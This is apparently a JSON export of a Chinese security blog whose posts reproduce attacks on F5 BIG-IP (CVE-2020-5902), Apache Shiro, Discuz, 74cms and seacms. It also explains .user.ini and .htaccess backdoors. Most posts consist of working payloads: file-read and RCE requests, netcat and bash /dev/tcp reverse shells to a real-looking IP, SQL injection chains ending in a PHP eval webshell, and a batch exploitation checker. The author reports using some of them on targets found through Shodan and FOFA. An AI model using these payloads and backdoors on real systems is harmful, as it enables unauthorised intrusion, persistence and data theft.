{"meta":{"title":"浅笑996的博客","subtitle":"","description":"","author":"qianxiao996","url":"http://blog.qianxiao996.cn","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2020-07-04T08:47:02.333Z","updated":"2020-07-04T08:47:02.333Z","comments":false,"path":"/404.html","permalink":"http://blog.qianxiao996.cn/404.html","excerpt":"","text":""},{"title":"关于","date":"2020-07-04T11:55:10.731Z","updated":"2020-07-04T11:55:10.731Z","comments":false,"path":"about/index.html","permalink":"http://blog.qianxiao996.cn/about/index.html","excerpt":"","text":"qianxiao996一个网络小白"},{"title":"书单","date":"2020-07-04T08:47:02.384Z","updated":"2020-07-04T08:47:02.384Z","comments":false,"path":"books/index.html","permalink":"http://blog.qianxiao996.cn/books/index.html","excerpt":"","text":""},{"title":"分类","date":"2020-07-04T09:17:27.642Z","updated":"2020-07-04T08:47:02.399Z","comments":false,"path":"categories/index.html","permalink":"http://blog.qianxiao996.cn/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-07-04T08:47:02.445Z","updated":"2020-07-04T08:47:02.445Z","comments":false,"path":"tags/index.html","permalink":"http://blog.qianxiao996.cn/tags/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2020-07-04T08:47:02.430Z","updated":"2020-07-04T08:47:02.430Z","comments":false,"path":"repository/index.html","permalink":"http://blog.qianxiao996.cn/repository/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2020-07-04T08:47:02.414Z","updated":"2020-07-04T08:47:02.414Z","comments":true,"path":"links/index.html","permalink":"http://blog.qianxiao996.cn/links/index.html","excerpt":"","text":""}],"posts":[{"title":"F5 BIG-IP TMUI 远程代码执行漏洞（CVE-2020-5902）复现","slug":"F5-BIG-IP-TMUI-远程代码执行漏洞（CVE-2020-5902）复现","date":"2020-07-12T08:31:55.000Z","updated":"2020-07-15T15:12:30.359Z","comments":true,"path":"2020/07/12/F5-BIG-IP-TMUI-远程代码执行漏洞（CVE-2020-5902）复现/","link":"","permalink":"http://blog.qianxiao996.cn/2020/07/12/F5-BIG-IP-TMUI-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-5902%EF%BC%89%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"1、漏洞描述F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。2020年7月1日，F5官方公布流量管理用户界面（TMUI）存在 前台远程执行代码（RCE）漏洞（CVE-2020-5902）。攻击者利用该漏洞，构造恶意请求，在未授权的情况下获得目标服务器的权限，实现远程代码执行。2、影响版本F5 BIG-IP &lt; 15.1.0.4F5 BIG-IP &lt; 14.1.2.6F5 BIG-IP &lt; 13.1.3.4F5 BIG-IP &lt; 12.1.5.2F5 BIG-IP &lt; 11.6.5.23、设备检索shodan1http.favicon.hash:-335242539 http.title:&quot;BIG-IP® ;- Redirect&quot;fofa1title&#x3D;&quot;BIG-IP® ;- Redirect&quot;censys1443.https.get.body_sha256:5d78eb6fa93b995f9a39f90b6fb32f016e80dbcda8eb71a17994678692585ee5 443.https.get.title:&quot;BIG-IP® ;- Redirect&quot;google1inurl:&quot;tmui&#x2F;login.jsp&quot; intitle:&quot;BIG-IP” inurl:“tmui&quot;shodan批量脚本，配置好api key直接https://github.com/aqhmal/CVE-2020-5902-Scanner1python3 scanner.py找到目标，开干4、漏洞复现POC：123GET &#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;system&#x2F;user&#x2F;authproperties.jsp GET &#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;util&#x2F;getTabSet.jsp?tabId&#x3D;AnyMsgHereWillBeReflectedInTheResponseRCE:这里的list 这些命令是防火墙自己定义的Tmsh命令。想了解请点击这个地址https://clouddocs.f5.com/api/tmsh/Other.html123curl -v -k &#39;https:&#x2F;&#x2F;[F5 Host]&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;tmshCmd.jsp?command&#x3D;list+auth+user+admin&#39; curl -v -k &#39;https:&#x2F;&#x2F;[F5 Host]&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;tmshCmd.jsp?command&#x3D;list+auth+userRead File:12345curl -v -k &#39;https:&#x2F;&#x2F;[F5 Host]&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;fileRead.jsp?fileName&#x3D;&#x2F;etc&#x2F;passwd&#39;fileRead.jsp?fileName&#x3D;&#x2F;etc&#x2F;hostsfileRead.jsp?fileName&#x3D;&#x2F;config&#x2F;bigip.licensefileRead.jsp?fileName&#x3D;&#x2F;config&#x2F;bigip.conffileRead.jsp?fileName&#x3D;&#x2F;usr&#x2F;local&#x2F;www&#x2F;tmui&#x2F;WEB-INF&#x2F;classes&#x2F;org&#x2F;apache&#x2F;jsp&#x2F;tmui&#x2F;system&#x2F;user&#x2F;authproperties_jsp.classList File12345&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;directoryList.jsp Example: directoryPath&#x3D;&#x2F;usr&#x2F;local&#x2F;www&#x2F;上传文件123Example: &#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;fileSave.jsp POST: fileName&#x3D;&#x2F;tmp&#x2F;1.txt&amp;content&#x3D;CVE-2020-5902123456789101112131415161718192021222324252627POST /tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 41fileName=/tmp/1.txt&amp;content=CVE-2020-5902HTTP/1.1 200 OKDate: Mon, 06 Jul 2020 02:05:29 GMTX-Frame-Options: SAMEORIGINStrict-Transport-Security: max-age=16070400; includeSubDomainsSet-Cookie: JSESSIONID=x; Path=/tmui; Secure; HttpOnlyContent-Type: text/html;charset=ISO-8859-1X-Content-Type-Options: nosniffX-XSS-Protection: 1; mode=blockContent-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data: http://127.4.1.1 http://127.4.2.1Vary: Accept-EncodingContent-Length: 4Connection: close5、Getshellpython exp修改自MSF的exphttps://github.com/jas502n/CVE-2020-5902在CVE-2020-5902.py里面修改好url。然后直接1python2 CVE-2020-5902.py输入命令即可执行得到shell1nc -e &#x2F;bin&#x2F;bash 129.204.113.202 5643监听1nc -lvvp 5546连上就断了，我没试其他的python应该能成功。msf1234wget -P &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;linux&#x2F;http&#x2F; https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploit-framework&#x2F;blob&#x2F;0417e88ff24bf05b8874c953bd91600f10186ba4&#x2F;modules&#x2F;exploits&#x2F;linux&#x2F;http&#x2F;f5_bigip_tmui_rce.rbmsfconsolereload_allsearch f5_bigip12345use exploit&#x2F;linux&#x2F;http&#x2F;f5_bigip_tmui_rceset rhost 1.2.3.4set lhost 129.204.113.202set lport 5567set payload cmd&#x2F;unix&#x2F;reverse_python用python反弹成功了。tmshCmd.jsp + fileSave.jsp = Linux RCE1234tmshCmd.jsp?command&#x3D;create+cli+alias+private+list+command+bashfileSave.jsp?fileName&#x3D;&#x2F;tmp&#x2F;cmd&amp;content&#x3D;idtmshCmd.jsp?command&#x3D;list+&#x2F;tmp&#x2F;cmdtmshCmd.jsp?command&#x3D;delete+cli+alias+private+list6、安全建议建议将F5 BIG-IP 升级至安全版本。下载地址参考：https://support.f5.com/csp/article/K521452547、修改的批量检查脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#!/usr/bin/env python3import reimport sysfrom datetime import datetimeimport requestsfrom time import sleepimport optparserequests.packages.urllib3.disable_warnings()def getTime(): now = datetime.now() return now.strftime('%H:%M:%S')def showInfo(message): print('[\\033[1;94m&#123;&#125;\\033[0;m] [*] &#123;&#125;'.format(getTime(), message))def showFail(message): print('[\\033[1;94m&#123;&#125;\\033[0;m] [\\033[1;91m-\\033[0;m] \\033[1;91m&#123;&#125;\\033[0;m'.format(getTime(), message))def showSuccess(message): print('[\\033[1;94m&#123;&#125;\\033[0;m] [\\033[1;92m+\\033[0;m] \\033[1;92m&#123;&#125;\\033[0;m'.format(getTime(), message))def exit(message = None): try: if message is not None: showFail(message) showInfo('Exiting script') sys.exit() except KeyboardInterrupt: passdef check(address): try: url1 = address+ '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash' url2 = address+ '/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&amp;content=id' url3 = address+ '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd' url4 = address+ '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list' requests.get(url1, verify=False, timeout=5) requests.get(url2, verify=False, timeout=5) r = requests.get(url3, verify=False, timeout=5) if 'uid=0(root)' in r.text: r = requests.get(address+ '/tmui/login.jsp', verify=False, timeout=5) hostname = re.search(r'&lt;p\\stitle=\\\"(.*?)\\\"&gt;', r.text).group(1).strip().lower() showSuccess('%s is vulnerable!'%(address)) with open('result.txt', 'a+') as f: f.write('%s\\n'%(address)) f.close() else: showFail('%s is not vulnerable'%(address)) requests.get(url4, verify=False, timeout=5) except KeyboardInterrupt: exit('User aborted!') except Exception as e: showFail(\"%s is not vulnerable\"%(address))def main(): try: commandList = optparse.OptionParser('usage: %prog -u URL [-f urls.txt]') commandList.add_option('-u', '--url', action=\"store\", help=\"Insert TARGET URL: http[s]://www.victim.com[:PORT]\", ) commandList.add_option('-f','--infile',action='store', help='Insert URL filename') options, remainder = commandList.parse_args() if not options.url and not options.infile: commandList.print_help() sys.exit(1) if options.url: urls = [options.url] check(urls[0]) if options.infile: f = open(options.infile, \"r\") for line in f.readlines(): check(line.strip()) f.close() except Exception as e: exit(e)if __name__ == '__main__': try: main() except KeyboardInterrupt: exit('User aborted!')8、相关链接https://support.f5.com/csp/article/K52145254http://element-ui.cn/news/show-718757.aspx","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://blog.qianxiao996.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://blog.qianxiao996.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"Apache Shiro反序列化远程代码执行漏洞复现","slug":"Apache-Shiro反序列化远程代码执行漏洞复现","date":"2020-04-09T12:22:15.000Z","updated":"2020-07-05T01:37:43.529Z","comments":true,"path":"2020/04/09/Apache-Shiro反序列化远程代码执行漏洞复现/","link":"","permalink":"http://blog.qianxiao996.cn/2020/04/09/Apache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"玄魂工作室大佬的文章https://mp.weixin.qq.com/s/8F5tmbJsE0SshrYK-fRl-g首先FOFA找一个环境，检测工具检测一下发现目标，开干!开启监听首先在vps运行nc 监听一个端口1nc -lvp 666列出需要使用的反弹指令1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;129.204.xxx.xxx&#x2F;666 0&gt;&amp;1将指令放到http://www.jackson-t.ca/runtime-exec-payloads.html转换成加密后的指令将指令合成为一个java的监听指令12java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;加密后的指令&#39;java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaxxxxxxxxxxxxxxxxxxxxxxxxxxxxkuMjA0LjExMy4yMDIvNjY2IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;运行以下指令开启java一个监听端口嗯。。。出错了难受，我又重新安装了mvn，然后打包的ysoserial.jarmvn安装：https://jingyan.baidu.com/article/d2b1d102b9dd855c7e37d486.html打包命令：1mvn clean package -DskipTests还是出错！最后才知道因为jdk版本的问题，只能用1.81234安装jdk1.8apt-get install oracle-java8-installer选择jdk版本update-alternatives --config java然后再运行就好了利用poc生成cookie我不是一个合格的网安人员。。1python2 -m pip install pycryptodome安装这个库就可以了。然后进入这个库的目录：Lib\\site-packages找到 crypto 这个库，更改为首字母大写 Crypto 即可得到cookie1rememberMe&#x3D;3Wb6O2eQTCeimDMS1uEUQANKouApX2EvmE7yZfXgnZWN+pxrZ4jH+CTcjRPRyuMXFt1NbRzH+IZhT7yoiK87ptD2HcSqqGKw50bEeDWdKPV7UDix82FQx5SQpYpVipyXk6LNO&#x2F;BMFtMzvEsdjB6b9hMsHqz8&#x2F;WVPWtT6V3J1Iq8oXm1MBfLSe7y8zd4BtM1vru+FyUSVdkw5Bv2pkB7o0LrUkhtbM58PVlxFgMBtU2nE0fvClfeX5ay0WINJjeGC8KQzMP0SFsWnnAwcJG513sPd796ppfEI8+esJ57yfRpiPXmlz9ZFMx66tvsVU9Enq1dCXOLNQPWkz+uLf5VDOO80nV6R0f+7+EXY&#x2F;egY7w+hWNKJwDngKXvuyINGhhOVOrEzneSfCtvD8tOadPcU7A&#x3D;&#x3D;抓包进行发送)弹回来了。机器到手，溜了溜了。。。小记crontab从文件导入和导出到文件1234#导入 [root@localhost ~]# crontab filename #导出 [root@localhost ~]# crontab -l &gt;filename","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://blog.qianxiao996.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CVE漏洞","slug":"CVE漏洞","permalink":"http://blog.qianxiao996.cn/tags/CVE%E6%BC%8F%E6%B4%9E/"}]},{"title":"CTF-Tools古典密码加解密工具","slug":"CTF-Tools古典密码加解密工具","date":"2020-01-07T11:22:15.000Z","updated":"2020-07-04T11:44:25.677Z","comments":true,"path":"2020/01/07/CTF-Tools古典密码加解密工具/","link":"","permalink":"http://blog.qianxiao996.cn/2020/01/07/CTF-Tools%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/","excerpt":"","text":"CTF-Tools一款CTF编码、解码、加密、解密工具。支持的编码解码:URL-UTF-8URL-GB2312UnicodeEscape(%U)HtmlEncodeACSIIBase16Base32Base64Str-&gt;HexShellcode支持的加密解密:Rot13凯撒密码栅栏密码培根密码摩斯密码移位密码云影密码当铺密码维尼吉亚密码进制转换:2-&gt;82-&gt;102-&gt;168-&gt;28-&gt;108-&gt;1610-&gt;210-&gt;810-&gt;1616-&gt;216-&gt;816-&gt;10任意进制转换在线编码网站:JsfuckAAencodeXXencodeJJencodeUUencodeBrainfuck/Ook!敲击码猪圈密码综合网站Github:https://github.com/qianxiao996/CTF-Tools/发行版下载地址:https://github.com/qianxiao996/CTF-Tools/releases/","categories":[{"name":"渗透工具","slug":"渗透工具","permalink":"http://blog.qianxiao996.cn/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"渗透工具","slug":"渗透工具","permalink":"http://blog.qianxiao996.cn/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"}]},{"title":"Discuz！X系列全版本后台sql注入复现","slug":"Discuz！X系列全版本后台sql注入复现","date":"2019-12-11T05:30:15.000Z","updated":"2020-07-04T12:47:10.307Z","comments":true,"path":"2019/12/11/Discuz！X系列全版本后台sql注入复现/","link":"","permalink":"http://blog.qianxiao996.cn/2019/12/11/Discuz%EF%BC%81X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"圈子某位大佬公布的0day，拿来刷一刷,漏洞分析请移步大佬文章。大佬链接0x01 环境准备1、首先去码云下载最新版本的discuz（DiscuzX 3.4 R20191201）。2、将upaod放置到网站目录下，访问安装目录安装即可。0x02 漏洞复现点击站长–UCenter设置点击最下面的提交进行抓包判断列数121&#39; order by 1 &#x2F;&#x2F;返回正确1&#39; order by 2 &#x2F;&#x2F;返回错误查询当前用户11&#39; and updatexml(1,concat(0x7e,(SELECT user())),1)-- a查询版本11&#39; and updatexml(1,concat(0x7e,(SELECT version())),1)-- a查询数据库12345671&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1)-- a &#x2F;&#x2F;mysql1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1)),1)-- a &#x2F;&#x2F;information_schema1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1)),1)-- a &#x2F;&#x2F;performance_schema1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 3,1)),1)-- a &#x2F;&#x2F;sys1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 4,1)),1)-- a &#x2F;&#x2F;test1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1)),1)-- a &#x2F;&#x2F;ultrax1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 6,1)),1)-- a &#x2F;&#x2F;空可以发现，共有6个库查询数据表这里随便找了一个库测试的，test库只有一个表。121&#39; and updatexml(1,concat(0x7e,(select TABLE_NAME from information_schema.tables where TABLE_SCHEMA&#x3D;&#39;test&#39; limit 0,1)),1)-- a &#x2F;&#x2F;users1&#39; and updatexml(1,concat(0x7e,(select TABLE_NAME from information_schema.tables where TABLE_SCHEMA&#x3D;&#39;test&#39; limit 1,1)),1)-- a &#x2F;&#x2F;空11&#39; and updatexml(1,concat(0x7e,(select group_concat(TABLE_NAME) from information_schema.tables where TABLE_SCHEMA&#x3D;&#39;mysql&#39;)),1)-- a查询字段11&#39; and updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;users&#39;)),1)-- a这个没显示全11&#39; and updatexml(1,concat(0x7e,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;users&#39; limit 2,1)),1)-- a &#x2F;&#x2F;user11&#39; and updatexml(1,concat(0x7e,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;users&#39; limit 5,1)),1)-- a &#x2F;&#x2F;password爆字段值11&#39; and updatexml(1,concat(0x7e,(select password from test.users limit 1,1)),1)-- a成功搞到密码test123写入文件Payload：11&#39; into outfile &#39;c:\\\\wamp64\\\\tmp\\\\1.txt&#39; -- aemmmm….The MySQL server is running with the –secure-file-priv option so it cannot execute this statement查看一下secure-file-priv配置1show variables like &#39;%secure%&#39;;secure_file_priv的值为null，那么secure_file_priv这里都有什么设置呢secure_file_priv为null 表示不允许导入导出secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹secure_file_priv没有设置时，则表示没有任何限制修改mysql.ini文件，加入如下语句1secure_file_priv&#x3D;&#39;&#39;重启mysql服务11&#39; union select &#39;&lt;?php eval($_GET[1])?&gt;&#39; into outfile &#39;C:\\\\phpstudy_pro\\\\WWW\\\\discuz\\\\1.php&#39; -- ahttp://192.168.91.149/discuz/1.php?1=phpinfo();0x03 结束吐槽一下，手注真麻烦，还是sqlmap好玩。","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://blog.qianxiao996.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://blog.qianxiao996.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"74cms v4.2.1-v4.2.129-后台getshell漏洞复现","slug":"74cms-v4-2-1-v4-2-129-后台getshell漏洞复现","date":"2019-12-09T02:30:15.000Z","updated":"2020-07-05T03:46:09.346Z","comments":true,"path":"2019/12/09/74cms-v4-2-1-v4-2-129-后台getshell漏洞复现/","link":"","permalink":"http://blog.qianxiao996.cn/2019/12/09/74cms-v4-2-1-v4-2-129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"0x00 影响范围v4.2.1-v4.2.1290x01 环境搭建先去官网下载 骑士人才系统基础版(安装包)2.将下载好的包进行安装0x02 复现过程当前版本v4.2.111点加工具，点击风格模板12345Payload：http:&#x2F;&#x2F;127.0.0.1&#x2F;74cms&#x2F;index.php?m&#x3D;admin&amp;c&#x3D;tpl&amp;a&#x3D;set&amp;tpl_dir&#x3D;&#39;,&#39;a&#39;,phpinfo(),&#39;shell地址：http:&#x2F;&#x2F;127.0.0.1&#x2F;74cms&#x2F;Application&#x2F;Home&#x2F;Conf&#x2F;config.php直接访问后端代码GETSHELLhttp://127.0.0.1/74cms/index.php?m=admin&amp;c=tpl&amp;a=set&amp;tpl_dir=&#39;,&#39;a&#39;,eval($_GET[1]),&#39;后端代码http://127.0.0.1/74cms/Application/Home/Conf/config.php?1=phpinfo();)0x03 漏洞分析请移步http://www.xinziyou123.com/%e6%96%b0%e7%89%8874cms-v4-2-1-v4-2-129-%e5%90%8e%e5%8f%b0getshell%e6%bc%8f%e6%b4%9e/","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://blog.qianxiao996.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://blog.qianxiao996.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":".user.ini和.htaccess文件构成的PHP后门","slug":"user-ini和-htaccess文件构成的PHP后门","date":"2019-10-31T12:30:15.000Z","updated":"2020-07-04T11:38:03.133Z","comments":true,"path":"2019/10/31/user-ini和-htaccess文件构成的PHP后门/","link":"","permalink":"http://blog.qianxiao996.cn/2019/10/31/user-ini%E5%92%8C-htaccess%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8/","excerpt":"","text":"0x01 .user.ini.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。我的nginx服务器全部是fpm/fastcgi，我的IIS php5.3以上的全部用的fastcgi/cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性。那么什么是.user.ini？这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。 在此可以查看：http://php.net/manual/zh/ini.list.php 这几种模式有什么区别？看看官方的解释：其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在这里又解释了：除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[&#39;DOCUMENT_ROOT&#39;] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。 不过，我们可以很容易地借助.user.ini文件来构造一个“后门”。Php配置项中有两个比较有意思的项（下图第一、四个）：auto_append_file、auto_prepend_file，点开看看什么意思：指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：1auto_prepend_file&#x3D;01.gif01.gif是要包含的文件。所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。测试一下，我分别在IIS6.0+Fastcgi+PHP5.3和nginx+fpm+php5.3上测试。 目录下有.user.ini，和包含webshell的01.gif，和正常php文件echo.php：访问echo.php即可看到后门：Nginx下同样：那么，我们可以猥琐地想一下，在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。0x02 .htaccess文件文件上传绕过一般.htaccess可以用来留后门和针对黑名单绕过创建一个txt写入（png解析为php）1AddType application&#x2F;x-httpd-php .png另存为.htaccess上传.htaccess 必须是网站根路径留后门可以在.htaccess 加入php解析规则类似于把文件名包含1的解析成php123&lt;FilesMatch &quot;1&quot;&gt; SetHandler application&#x2F;x-httpd-php &lt;&#x2F;FilesMatch&gt;123456.png 就会以php执行","categories":[{"name":"权限维持","slug":"权限维持","permalink":"http://blog.qianxiao996.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"后门","slug":"后门","permalink":"http://blog.qianxiao996.cn/tags/%E5%90%8E%E9%97%A8/"}]},{"title":"FrameScan-GUI CMS漏洞扫描","slug":"FrameScan-GUI-CMS漏洞扫描","date":"2019-10-06T02:30:15.000Z","updated":"2020-07-04T11:27:08.874Z","comments":true,"path":"2019/10/06/FrameScan-GUI-CMS漏洞扫描/","link":"","permalink":"http://blog.qianxiao996.cn/2019/10/06/FrameScan-GUI-CMS%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/","excerpt":"","text":"工具简介FrameScan-GUI是一款python3和Pyqt编写的具有图形化界面的cms漏洞检测框架，是FrameScan的加强版。支持多种检测方式，支持大多数CMS，可以自定义CMS类型及自行编写POC。旨在帮助有安全经验的安全工程师对已知的应用快速发现漏洞。Github地址：https://github.com/qianxiao996/FrameScan-GUI下载地址：https://github.com/qianxiao996/FrameScan-GUI/releases支持平台- Windows使用方法下载本项目，运行exe即可。自定义POC模板以下为POC模板，请尽量规范编写。脚本中为示例代码。123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env python# -*- coding: utf-8 -*-'''name: 漏洞名称（禁止换行）控制在30字以内referer: 漏洞地址（禁止换行）未知请填unknownauthor: 作者名description: 漏洞描述 '''import sysimport requestsimport warningsdef run(url): #此处编辑检测代码 #示例代码，请更改result内容，result[0]为漏洞名称,result[1]为返回的内容，result[2]为测试结果 result = ['seacms v6.5.5代码执行漏洞','',''] headers = &#123; \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\" &#125; payload = \"searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:as&#123;searchpage:area&#125;&#125;&amp;area=s&#123;searchpage:letter&#125;&amp;letter=ert&#123;searchpage:lang&#125;&amp;yuyan=($_SE&#123;searchpage:jq&#125;&amp;jq=RVER&#123;searchpage:ver&#125;&amp;&amp;ver=[QUERY_STRING]));/*\" url_path = url + \"/search.php?phpinfo();\" try: data = requests.get(url_path, timeout=3,headers=headers, verify=False) if data.status_code == 200 and 'phpinfo' in data.text: result[2]= \"存在\" result[1] = \"URL:%s\\nPOST:%s\"%(url_path,payload) else: result[2] = \"不存在\" except Exception as e: # print (e) result[2] =\"不存在\" #这里可设置未知，连接超时等，只有不存在不会显示到结果中。 return result #最后一定要返回一个带有3个参数的列表。不然会出错误。if __name__ == \"__main__\": #此处不会调用 warnings.filterwarnings(\"ignore\") testVuln = run(\"http://baidu.com\") 